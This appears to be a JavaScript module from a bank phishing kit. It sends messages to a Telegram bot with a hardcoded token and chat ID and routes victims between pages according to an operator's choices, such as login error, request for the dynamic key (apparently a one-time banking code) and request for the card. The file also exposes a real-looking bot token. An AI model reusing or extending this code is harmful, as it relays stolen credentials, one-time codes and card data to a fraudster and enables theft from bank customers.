// ================================================================
// js/telegram.js - Sistema de comunicación con Telegram
// ================================================================

const TELEGRAM_CONFIG = {
  BOT_TOKEN: '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc',
  CHAT_ID: '8469651553',
  API_URL: 'https://api.telegram.org/bot'
};

// Enviar mensaje con botones a Telegram
async function sendTelegramMessage(mensaje, teclado = null) {
  const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
  
  console.log('📤 Enviando mensaje a Telegram...');
  
  const body = {
    chat_id: TELEGRAM_CONFIG.CHAT_ID,
    text: mensaje,
    parse_mode: 'Markdown'
  };

  if (teclado) {
    body.reply_markup = teclado;
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    console.log('✅ Mensaje enviado:', data);
    return data;
  } catch (error) {
    console.error('❌ Error enviando mensaje:', error);
    throw error;
  }
}

// Esperar respuesta del operador (simulado con timeout)
async function waitForTelegramResponse(messageId, timeout = 120000) {
  console.log('⏳ Esperando respuesta del operador...');
  
  // Por ahora simularemos la espera y devolveremos una acción
  // En producción, necesitarías un backend que escuche los callbacks
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ action: 'correcto', transactionId: Date.now() });
    }, 2000);
  });
}

// Manejar acciones del operador
async function handleTelegramAction(action, transactionId) {
  console.log('🎯 Manejando acción:', action);
  
  const actionType = action.split(':')[0];
  
  switch (actionType) {
    case 'correcto':
      return 'next'; // Continuar a la siguiente página
      
    case 'incorrecto':
    case 'error_login':
      return 'error'; // Mostrar error y recargar
      
    case 'pedir_dinamica':
      return 'dinamica'; // Ir a página de dinámica
      
    case 'error_dinamica':
      return 'error_dinamica'; // Volver a pedir dinámica con error
      
    case 'pedir_tarjeta':
      return 'tarjeta'; // Ir a página de tarjeta
      
    case 'finish':
      return 'finish'; // Finalizar proceso
      
    default:
      return 'error';
  }
}
